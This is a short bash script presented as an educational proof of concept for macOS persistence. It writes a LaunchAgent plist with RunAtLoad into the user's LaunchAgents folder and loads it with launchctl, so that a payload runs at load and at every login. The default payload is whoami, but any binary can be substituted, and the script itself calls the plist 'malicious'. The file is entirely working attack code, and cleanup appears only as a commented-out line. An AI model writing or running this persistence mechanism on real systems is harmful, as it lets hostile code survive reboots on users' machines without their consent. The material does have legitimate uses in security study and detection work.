#!/bin/bash
# ------------
# macOS LaunchAgent PoC – Educational Use Only
# Writes a LaunchAgent .plist file that executes a payload (default: `whoami`)
# upon load or user login via launchctl.
# Permit execution with: chmod +x poc.sh
# Run: ./poc.sh [--payload /path/to/binary]
# Author: SentinelByte
# Version: 1.05
# ------------

set -euo pipefail

# Configuration
PLIST_NAME="com.user.launchdemo.plist"
PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME"
PAYLOAD="/usr/bin/whoami"  # default; override with --payload

while [[ $# -gt 0 ]]; do
    case "$1" in
        --payload) PAYLOAD="$2"; shift 2 ;;
        *) echo "Usage: $0 [--payload /path/to/binary]" >&2; exit 1 ;;
    esac
done

# Main Logic
echo "[*] Writing malicious LaunchAgent plist to: $PLIST_PATH"

# Generate the .plist file with appropriate XML structure
cat > "$PLIST_PATH" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.launchdemo</string>

    <key>ProgramArguments</key>
    <array>
        <string>$PAYLOAD</string>
    </array>

    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

echo "[+] LaunchAgent plist written."

# Attempt to load the LaunchAgent via launchctl
echo "[*] Loading LaunchAgent using launchctl (output from payload should follow):"
launchctl load "$PLIST_PATH"

# Optional cleanup instruction
# echo "[*] To remove this LaunchAgent, run: launchctl unload '$PLIST_PATH' && rm '$PLIST_PATH'"
